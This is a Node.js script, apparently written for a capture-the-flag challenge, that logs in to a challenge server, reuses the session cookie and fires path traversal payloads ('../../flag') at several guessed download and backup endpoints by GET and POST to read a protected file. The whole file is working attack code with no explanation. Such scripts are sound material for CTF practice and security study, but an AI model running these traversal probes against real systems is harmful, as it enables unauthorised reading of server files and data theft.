
const http = require('http');
const querystring = require('querystring');

const uid = "f5dbc9de539a43369524a3b9ed5a3aba";
const loginData = querystring.stringify({uid: uid});

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

console.log("Logging in...");
const req = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Logged in, trying all possible endpoints...\n");

  const endpoints = [
    '/download?file=../../flag',
    '/getbackup?file=../../flag',
    '/read?file=../../flag',
    '/file?file=../../flag',
    '/api/read?file=../../flag',
    '/api/download?file=../../flag',
    '/admin/backup',
    '/admin/backup?file=../../flag',
  ];

  let done = 0;
  endpoints.forEach(endpoint => {
    const opts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: endpoint,
      method: 'GET',
      headers: {
        'Cookie': cookie
      }
    };

    const req = http.request(opts, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        console.log(`\n=== ${endpoint} ===`);
        console.log(body);
        done++;
        if (done === endpoints.length) {
          console.log("\n✅ All endpoints tried");
        }
      });
    });
    req.end();
  });

  // Also try POST to /download
  console.log("\n=== POST /download ===\n");
  const postData = querystring.stringify({file: '../../flag'});
  const postOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/download',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };
  const postReq = http.request(postOpts, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\n=== POST /download ===");
      console.log(body);
    });
  });
  postReq.end();
});

req.on('error', err => console.error(err));
req.write(loginData);
req.end();
